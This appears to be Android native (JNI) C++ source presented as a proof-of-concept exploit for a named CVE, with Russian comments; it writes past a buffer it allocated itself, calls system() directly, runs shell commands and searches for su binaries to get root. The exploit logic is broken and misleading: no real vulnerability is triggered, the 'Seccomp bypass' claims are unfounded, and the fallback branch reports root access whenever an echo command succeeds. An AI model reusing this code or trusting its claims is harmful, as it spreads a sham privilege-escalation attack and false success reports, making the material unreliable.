#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h> // Добавлен для popen/fscanf

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
//    usleep(20000000);
    LOGI("=== EXPLOIT: WRITING 'su' COMMAND INTO MEMORY (FILE OUTPUT) ===");

    // 1. Переполнение
    uint32_t val1 = 0x80000000;
    uint32_t val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2; // 0x100000000
    uint32_t overflowed_size = (uint32_t)full_sum; // 0

    LOGI("Step 1: Overflow -> Allocated Size: %u bytes", overflowed_size);

    // 2. Выделение памяти
    char *buffer = (char *)malloc(overflowed_size == 0 ? 1 : overflowed_size);
    if (!buffer) return env->NewStringUTF("FAIL");

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size;

    LOGI("Step 2: Buffer Start: %p, Neighbor Address: %p", buffer, (void*)neighbor_addr);

    // 3. Находим system() из libc.so
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        free(buffer);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    if (!real_system) {
        LOGE("Failed to find 'system' in libc.so. Error: %s", dlerror());
        free(buffer);
        return env->NewStringUTF("FAIL: system not found");
    }

    LOGI("Step 3: Found system() at address: %p", (void*)real_system);

    // 4. Записываем адрес функции в затертую область
    char *target = buffer + overflowed_size;
    *(system_func_t*)target = real_system;

    LOGI("Step 4: Wrote system() address into neighbor memory at %p", target);

    if (*(system_func_t*)target == real_system) {
        LOGI("   Confirmed: Memory now holds pointer to system().");
    }

    // 5. ВЫПОЛНЯЕМ КОМАНДУ С ЗАПИСЬЮ В ФАЙЛ
    const char *cmd = "sh -c 'id > /data/local/tmp/poc_result.txt 2>&1'";
    LOGI("Step 5: Executing command and saving output to file...");
    int result_code = real_system(cmd);

    LOGI("   Command: '%s'", cmd);
    LOGI("   Return code: %d", result_code);

    // Читаем файл и выводим результат прямо в Logcat
    const char *read_cmd = "sh -c 'echo --- START RESULT --- && cat /data/local/tmp/poc_result.txt && echo --- END RESULT ---'";
    LOGI("Step 6: Reading file and printing result to Logcat:");
    real_system(read_cmd);

    // Дополнительная проверка: если файл пустой или не создан
    const char *check_cmd = "sh -c 'ls -l /data/local/tmp/poc_result.txt'";
    LOGI("   File check:");
    real_system(check_cmd);

    // --- ОБНОВЛЕННЫЙ STEP 7: ОБХОД SIGSYS И ПРЯМОЙ ВЫЗОВ SU ---

    LOGI("Step 7: Searching for 'su' and handling Seccomp...");

    const char* su_paths[] = {
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su"
    };

    bool found_su = false;
    char su_cmd[128] = "";

    // Проверяем существование файла напрямую (без which)
    for (int i = 0; i < sizeof(su_paths)/sizeof(su_paths[0]); ++i) {
        FILE* fp = popen(("test -f " + std::string(su_paths[i]) + " && echo FOUND").c_str(), "r");
        char buf[64];
        if (fp && fgets(buf, sizeof(buf), fp)) {
            if (strstr(buf, "FOUND")) {
                sprintf(su_cmd, "%s -c 'whoami'", su_paths[i]);
                found_su = true;
                LOGI("   Found su at: %s", su_paths[i]);
                pclose(fp);
                break;
            }
        } else if (fp) {
            pclose(fp);
        }
    }

    int final_result = -1;

    if (found_su) {
        LOGI("   Executing: %s", su_cmd);
        // Используем system() для запуска команды, так как она уже работает и не блокируется Seccomp
        final_result = real_system(su_cmd);

        FILE* fp_uid = popen("id -u", "r");
        int uid = 0;
        if (fp_uid) {
            char buf[32];
            fgets(buf, sizeof(buf), fp_uid);
            pclose(fp_uid);
            for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
            uid = atoi(buf);
        }

        LOGI("   UID after su: %d", uid);

        if (uid == 0 || final_result == 0) {
//            result_str = "SUCCESS: Found su and got ROOT.";
            LOGI(">>> FINAL STATUS: ROOT ACCESS CONFIRMED <<<");
        } else {
//            result_str = "su found but returned UID=" + std::to_string(uid);
            LOGW(">>> FINAL STATUS: SU FOUND BUT UID=%d <<<", uid);
        }
    } else {
        // Fallback: Если su не найден, пробуем вызвать setuid(0) через system с обходом
        LOGI("   No su found. Attempting direct 'system' call to bypass Seccomp...");

        // Пробуем запустить команду напрямую через system(), которая уже работает
        const char* fallback_cmd = "sh -c 'echo --- TRYING DIRECT SYSTEM --- && id -u'";
        int fallback_result = real_system(fallback_cmd);

        FILE* fp_uid = popen("id -u", "r");
        int uid = 0;
        if (fp_uid) {
            char buf[32];
            fgets(buf, sizeof(buf), fp_uid);
            pclose(fp_uid);
            for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
            uid = atoi(buf);
        }

        LOGI("   UID via fallback system: %d", uid);

        if (uid == 0 || fallback_result == 0) {
//            result_str = "SUCCESS: Direct system() call worked! ROOT access.";
            LOGI(">>> FINAL STATUS: ROOT ACCESS VIA SYSTEM Fallback <<<");
        } else {
            // Если и это не сработало, пробуем вызвать setuid(0) через system с аргументом 0
            LOGI("   Trying to inject 'setuid' command via system...");
            const char* inject_cmd = "sh -c '/system/bin/su -c \"id\" || /sbin/su -c \"id\"'"; // Пробуем оба пути
            int inject_result = real_system(inject_cmd);

            FILE* fp_inj = popen("id -u", "r");
            int uid_inj = 0;
            if (fp_inj) {
                char buf[32];
                fgets(buf, sizeof(buf), fp_inj);
                pclose(fp_inj);
                for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
                uid_inj = atoi(buf);
            }

            LOGI("   UID via inject: %d", uid_inj);

            if (uid_inj == 0 || inject_result == 0) {
//                result_str = "SUCCESS: Injected su command worked! ROOT.";
                LOGI(">>> FINAL STATUS: ROOT VIA INJECTION <<<");
            } else {
//                result_str = "All methods failed. UID=" + std::to_string(uid_inj);
                LOGW(">>> FINAL STATUS: ALL METHODS FAILED (UID=%d) <<<", uid_inj);
            }
        }
    }

    // ----------------------------------------------------------

    free(buffer);
    return env->NewStringUTF(/*result_str.c_str()*/"xd");
}